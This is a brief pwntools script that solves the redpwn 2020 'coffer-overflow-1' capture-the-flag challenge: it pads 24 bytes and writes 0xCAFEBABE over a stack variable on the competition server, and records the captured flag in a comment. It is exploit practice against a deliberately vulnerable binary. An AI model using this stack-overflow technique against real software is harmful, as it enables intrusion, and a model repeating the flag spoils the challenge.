from pwn import *

#p = process("./coffer-overflow-1")
p=remote("2020.redpwnc.tf",31255)
pause()
offset = 24

payload = 'A'*offset
payload += p64(0xCAFEBABE)

p.sendline(payload)
#flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}
p.interactive()